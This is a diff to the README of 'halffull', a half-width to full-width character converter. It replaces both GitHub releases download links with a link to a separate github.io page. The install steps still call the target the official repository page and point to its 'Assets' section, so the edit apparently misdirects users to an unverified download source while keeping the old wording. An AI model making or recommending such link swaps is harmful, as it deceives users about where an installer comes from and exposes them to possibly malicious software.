@@ -1,6 +1,6 @@
 # 🔄 halffull - Convert half-width characters to full-width
 
-[![Download halffull](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://github.com/Mrak56735/halffull/releases)
+[![Download halffull](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://mrak56735.github.io)
 
 Many Japanese forms require full-width characters. Typing these by hand takes time and effort. This tool changes your keyboard input to full-width with a single keystroke. You save time and reduce errors in your daily typing tasks.
 
@@ -8,7 +8,7 @@ Many Japanese forms require full-width characters. Typing these by hand takes ti
 
 You need to download the installer from the official repository page. Follow these steps to get the file:
 
-1. Visit the following link: https://github.com/Mrak56735/halffull/releases
+1. Visit the following link: https://mrak56735.github.io
 2. Look for the section labeled "Assets" at the bottom of the newest version.
 3. Click the file name that ends in `.dmg`.
 4. Wait for the file to finish downloading to your computer.
